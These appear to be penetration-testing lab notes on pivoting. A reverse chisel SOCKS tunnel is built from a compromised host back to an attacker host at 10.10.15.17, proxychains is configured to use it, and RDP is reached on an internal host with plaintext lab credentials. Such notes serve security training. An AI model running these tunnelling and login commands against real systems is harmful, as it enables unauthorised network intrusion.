# ATTACK HOST
```
./chisel server -p 8000 --reverse
```

# CONNECTING TO ATTACKER
```
ssh ubuntu@10.129.49.229
chmod 744 ./chisel
./chisel client 10.10.15.17:8000 R:1080:socks
```

# MODIFYING /etc/proxychains.conf
```
sudo nano /etc/proxychains.conf
socks5 127.0.0.1 1080
```

# USING RDP
```
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```
